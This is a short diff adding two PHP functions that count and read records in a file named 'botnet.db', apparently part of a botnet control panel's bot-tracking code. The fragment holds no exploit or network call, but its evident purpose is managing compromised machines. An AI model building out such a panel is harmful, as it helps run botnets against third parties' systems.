@@ -1,0 +1,8 @@
+function database_count_bots() { return count(file('./botnet.db')); }
+
+function database_read_bot($userid) {
+	$database_array = file('./botnet.db');
+	if(!$database_array[$userid]) { return "BAD/404"; } else { return 
+explode(" ", $database_array[$userid]); }
+}
+
